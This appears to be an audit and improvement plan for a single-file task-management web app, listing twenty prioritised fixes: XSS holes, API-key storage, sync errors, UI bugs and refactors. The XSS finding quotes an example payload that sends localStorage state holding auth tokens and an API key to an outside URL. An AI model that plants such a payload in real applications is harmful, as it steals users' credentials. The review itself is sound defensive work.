# Givelink / Task OS — Improvement Plan

_Generated: 2026-07-13 | Scope: index.html (14 401 lines), givelink.html, api/claude.js, sw.js_

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. Push notification icon is a 404
**What:** Service worker references `./icons/icon-192.png` but that directory doesn't exist — the actual file is `./icon-192.png`.  
**Where:** `sw.js:42-43`  
**Why it matters:** Every push notification shows a broken badge/icon on Android and iOS PWA. Users who opted in to reminders see a visually broken notification, eroding trust.  
**Effort:** S  
**Suggested fix:**
- Change `icon:'./icons/icon-192.png'` → `'./icon-192.png'`
- Change `badge:'./icons/icon-192.png'` → `'./icon-192.png'`

---

### 2. XSS in weekly review wizard — task/goal content injected raw into innerHTML
**What:** Weekly review wizard renders `t.title`, `g.title`, `g.description`, and backlog promotion rows directly into template literals that feed `body.innerHTML`, with no `esc()` call.  
**Where:** `index.html:3448, 3471, 3478, 3480`  
**Why it matters:** In hosted (multi-user) mode, any user can craft a task title like `<img src=x onerror=fetch('…?k='+localStorage.getItem('taskos'))>` and execute arbitrary JS in their own session — leaking the Supabase token, synced state, and Claude key. A future shared/collaborative task would make this cross-user.  
**Effort:** S  
**Suggested fix:**
- Wrap every `${t.title}`, `${g.title}`, `${g.description}` inside `${esc(…)}` at lines 3448, 3471, 3478, 3480
- Audit the pattern at lines 3396, 5417, 5444, 5447, 5449, 5453 and `renderRelationships()` (people name/notes/why) — all the same fix

---

### 3. Claude API key persisted inside the full state blob in localStorage
**What:** `S.claudeKey` is stored inside the monolithic `S` object, which is serialized as `localStorage.setItem('taskos', JSON.stringify(S))` on every save. The key sits exposed in a well-known key, accessible to any injected script.  
**Where:** `index.html:2404` (S definition), `index.html:9770` (save to S), `index.html:4878` (used in direct API calls)  
**Why it matters:** Combined with the XSS issues above, the full API key is one payload away from exfiltration. In hosted mode, Supabase sync also ships the key to the cloud row.  
**Effort:** S  
**Suggested fix:**
- Move the Claude key out of `S`: `localStorage.setItem('taskos_claude_key', k)` in `saveSettings()`, read with `localStorage.getItem('taskos_claude_key')` in `callClaude()`
- Remove `claudeKey` from the `S` definition so it's never synced or leaked in the state export

---

### 4. Stale key check silently suppresses morning briefing for some users
**What:** `_maybeShowMorningBriefing()` guards on `if(!S.claudeKey && !localStorage.getItem('taskos_api_key')) return` — but `taskos_api_key` was an old key name that was superseded by `S.claudeKey`. Users who set their key after this rename never had `taskos_api_key` written, so the secondary check is a dead fallback that does nothing. The briefing still works if `S.claudeKey` is set, but the stale check is confusing and could mask a regression.  
**Where:** `index.html:11150`  
**Why it matters:** Briefing is one of the highest-engagement features; a subtle guard failure causes silent no-ops.  
**Effort:** S  
**Suggested fix:**
- Remove `&& !localStorage.getItem('taskos_api_key')` — the single `S.claudeKey` check is correct
- If the Claude key is being moved to its own localStorage key (fix #3), update this check to match

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 5. `aiProxy` is empty — all hosted users need a personal API key for AI features
**What:** `APP_CONFIG.aiProxy` is `''` meaning every AI button shows "Add your Claude API key in Settings first" to hosted users. There is a working proxy in `/api/claude.js` but it isn't wired up.  
**Where:** `index.html:9812`, `api/claude.js`  
**Why it matters:** AI-powered features (plan my day, triage, morning briefing) are core to the value proposition. Blocking them behind a personal API key signup is the #1 conversion killer for new hosted users.  
**Effort:** M  
**Suggested fix:**
- Deploy `api/claude.js` on Vercel and set `aiProxy: 'https://<your-app>.vercel.app/api/claude'` in APP_CONFIG
- Add per-user rate limiting (Upstash Redis + sliding window) before enabling — the proxy comment already flags this

---

### 6. Relationship people names/notes injected raw into innerHTML
**What:** `renderRelationships()` (and the "Top people" modal) inserts `p.name`, `p.why`, `p.notes`, and `p.type` directly into `innerHTML` without `esc()`.  
**Where:** `index.html:5417, 5444, 5447, 5449, 5453`  
**Why it matters:** A contact name with `<b>` or `'` breaks the rendered card; with a script tag it executes in the user's session.  
**Effort:** S  
**Suggested fix:**
- Replace all bare `${p.name}`, `${p.notes}`, `${p.why}`, `${p.type}` with `${esc(p.name)}` etc.
- Same fix for `renderInvestments()` at line 5190 (`${i.name}`)

---

### 7. Account chip menu positions incorrectly on mobile
**What:** `_openAcctMenu()` reads `el.offsetHeight` immediately after `el.style.display='block'`, before the browser reflows. On mobile where layout is slower, `offsetHeight` can be 0, positioning the menu at the wrong Y coordinate (overlapping the chip instead of floating above it). The sidebar is also hidden on mobile, so the chip is inaccessible without opening the hamburger.  
**Where:** `index.html:9997-10008` (account chip menu)  
**Why it matters:** Account management (rename, sign out) is unreachable on mobile for signed-in hosted users.  
**Effort:** M  
**Suggested fix:**
- Use `requestAnimationFrame` or `setTimeout(0)` around the position calculation to ensure the element has been painted
- On mobile, render the account chip inside the slide-out nav drawer, or add a fallback route via Settings

---

### 8. No loading feedback during Supabase sync failures — error is a silent status pill
**What:** When sync fails, `_sbSetStatus('⚠ ' + e.message)` updates a tiny pill that most users never notice. There is no toast, no retry prompt, and no data-loss warning.  
**Where:** `index.html:10083` (`catch` in `sbSyncNow`)  
**Why it matters:** A user who works offline and then sees the pill change to a warning may not realise their data wasn't pushed. A failed push means data loss risk on next login from another device.  
**Effort:** S  
**Suggested fix:**
- On failed push (not pull), call `toast('⚠ Sync failed — ' + e.message + '. Will retry when online.', 5000)` so the error is unmissable
- Set `_sbPending=true` so the next online event triggers an automatic retry (already done, just needs the toast)

---

### 9. `givelink.html` uses a completely different design language from the main app
**What:** `givelink.html` defines its own CSS variables (`--accent:#3b82f6` blue, `--pr:#f472b6` pink) with none of the main app's purple brand palette, different sidebar styles, different badge/button patterns.  
**Where:** `givelink.html:16-20` (`:root` vars), `givelink.html:93-95` (`.pri-*` badge colors)  
**Why it matters:** Users switching between the two pages experience a jarring brand disconnect. The pink priority badge on a blue accent page directly violates the no-pink-on-purple rule.  
**Effort:** M  
**Suggested fix:**
- Replace `:root` variables in `givelink.html` with the shared purple system: `--accent:#8b7cff`, `--brand2:#c08cff`
- Replace status/priority colors with the unified `--q1/--q2/--q3` palette already defined in `index.html`

---

### 10. Auth gate doesn't restore button state if `_afterAuth()` throws
**What:** In `authSubmit()`, `btn.disabled=true` and `btn.textContent='…'` are set before the `try` block. If `_afterAuth()` throws (e.g., sync error on a fresh user), the catch re-enables the button — but if an unhandled promise rejection occurs inside `_afterAuth`, the button stays disabled forever.  
**Where:** `index.html:9930, 9944-9948`  
**Why it matters:** Users are stuck looking at a disabled "…" login button with no way to retry without a page reload.  
**Effort:** S  
**Suggested fix:**
- Wrap `await _afterAuth()` in its own `try/catch` inside the outer try, so auth-success + sync-failure are handled separately
- Alternatively, move button reset into a `finally` block

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 11. Entire application in a single 14 401-line HTML file
**What:** `index.html` contains all CSS, HTML, and JS in one file with no module boundaries, build step, or code splitting.  
**Where:** `index.html` (entire file)  
**Why it matters:** Finding any function requires search. Adding a feature means scrolling through 14k lines. No tree-shaking, no dead code detection, no linting, no type safety.  
**Effort:** L  
**Suggested fix:**
- Extract JS into ES modules (`src/state.js`, `src/ai.js`, `src/sync.js`, `src/views/`)
- Extract CSS to a stylesheet (or Tailwind/CSS modules)
- This is the only item in the plan that qualifies as "partial rewrite" and pays back on every future change

---

### 12. `seed()` function is 391 lines and contains hard-coded personal data
**What:** The `seed()` function contains ~389 hard-coded tasks, goals, and personal data. In hosted mode this function is now gated off, but it still ships to every user's browser and consumes parsing time.  
**Where:** `index.html` — `function seed(){` (391 lines)  
**Why it matters:** Dead code that ships to all hosted users. Also a privacy concern if the owner ever makes the source public — all personal tasks are in the repo.  
**Effort:** M  
**Suggested fix:**
- Move seed data to a JSON file loaded lazily and only in local/dev mode
- Gate the `seed()` call behind `if(process.env.NODE_ENV==='development')` once a build step exists

---

### 13. `S._welcomed` added to state but absent from the initial S definition
**What:** `_welcomeSeed()` sets `S._welcomed = true` and saves, but `_welcomed` is not in the initial `S` object at line 2404. On a fresh browser, `S._welcomed` is `undefined` (falsy), so the welcome seed correctly fires once. But the field isn't typed or documented, making it invisible.  
**Where:** `index.html:2404` (S definition), `index.html:10078, 10088`  
**Why it matters:** Low immediate risk, but if anyone clears `taskos` from localStorage manually and then re-syncs, the Supabase row has `_welcomed: true` but the fresh `S` doesn't — welcome seed fires again, duplicating the starter tasks.  
**Effort:** S  
**Suggested fix:**
- Add `_welcomed: false` to the S definition at line 2404
- In `_welcomeSeed()`, check both `S._welcomed` and the incoming remote data before seeding

---

### 14. `renderDash()` is 162 lines with mixed concerns
**What:** The `renderDash()` function renders stats, top-3 tasks, goal links, habit widgets, Givelink metrics, quests, and push notifications all in one function with no sub-rendering helpers.  
**Where:** `index.html` — `function renderDash(){` (~162 lines)  
**Why it matters:** Any dashboard bug requires reading 162 lines. Adding a widget means touching the same function that controls push notification scheduling.  
**Effort:** M  
**Suggested fix:**
- Extract each widget into a named `_renderDashXxx()` helper called from a thin `renderDash()` orchestrator
- No behavior change needed — pure refactor

---

## 💡 P3 — Nice to have

### 15. Hardcoded amber `#fbbf24` used for streaks and score highlights without a CSS variable
**What:** The amber color appears ~8 times as a hardcoded hex (streak chip, health scores, habit projector) rather than through the design token system.  
**Where:** `index.html:145, 408, 430, 1025, 1358, 3501` (and more)  
**Why it matters:** Brand audit friction — when the palette changes, these won't update automatically and may clash.  
**Effort:** S  
**Suggested fix:** Add `--amber: #fbbf24` (dark) / `--amber: #d97706` (light) to `:root` and `body.light` and replace inline hex values

---

### 16. Goal description and investment name unescaped in goals view
**What:** `goalHTML()` renders `g.description` directly into innerHTML (line 3448); `renderInvestments()` renders `i.name` directly (line 5190).  
**Where:** `index.html:3448, 5190`  
**Why it matters:** Allows stored HTML to break goal card layout. Low exploit risk in single-user mode; medium in hosted.  
**Effort:** S  
**Suggested fix:** Wrap both in `esc()`.

---

### 17. `api/claude.js` proxies to `claude-haiku-4-5-20251001` with a hard-coded model string
**What:** The model is hard-coded in the proxy. Upgrading to a newer model requires a code deploy.  
**Where:** `api/claude.js:42`  
**Why it matters:** Not critical, but means the proxy can't be updated via an env var.  
**Effort:** S  
**Suggested fix:** `const model = process.env.CLAUDE_MODEL || 'claude-haiku-4-5-20251001'`

---

### 18. Missing `aria-label` on icon-only buttons throughout the app
**What:** The app has ~982 interactive elements but only ~88 ARIA attributes. Close buttons (`×`), emoji-only action buttons, and the hamburger menu have no accessible label.  
**Where:** `index.html` — modal close buttons, FAB actions, sidebar toggle  
**Why it matters:** Screen readers announce "button" with no context. Keyboard-only users can't identify what most buttons do.  
**Effort:** M  
**Suggested fix:**
- Add `aria-label="Close"` to all `×` / `✕` close buttons
- Add `aria-label="Open menu"` to the hamburger
- Add `role="dialog"` and `aria-labelledby` to each `.mo` modal

---

### 19. Service worker caches `givelink.html` but no recovery for API calls offline
**What:** External API calls (Claude, Supabase, Readwise, Notion) return `503` or are silently dropped when offline (`sw.js:94`). There is no user-facing "you're offline — changes will sync when reconnected" message for API-backed features.  
**Where:** `sw.js:93-96`; `index.html:12070-12071` (online/offline events)  
**Why it matters:** A user on a train who tries to use AI features gets a raw `toast('AI error: Failed to fetch')` with no context.  
**Effort:** S  
**Suggested fix:** In `callClaude()`, detect `!navigator.onLine` before fetching and show `toast('You're offline — AI features need a connection.')` instead of the generic error

---

### 20. No `.env.example` documenting required environment variables
**What:** `api/claude.js` requires `ANTHROPIC_API_KEY`, `SUPABASE_URL`, `SUPABASE_ANON_KEY` but there is no `.env.example` file.  
**Where:** `api/claude.js:1-13` (setup comment)  
**Why it matters:** A new contributor or deployment can't tell what env vars are needed without reading the source.  
**Effort:** S  
**Suggested fix:** Add `.env.example` with placeholder values for the three required vars and the two optional ones (`CLAUDE_MODEL`, `POSTHOG_KEY`)
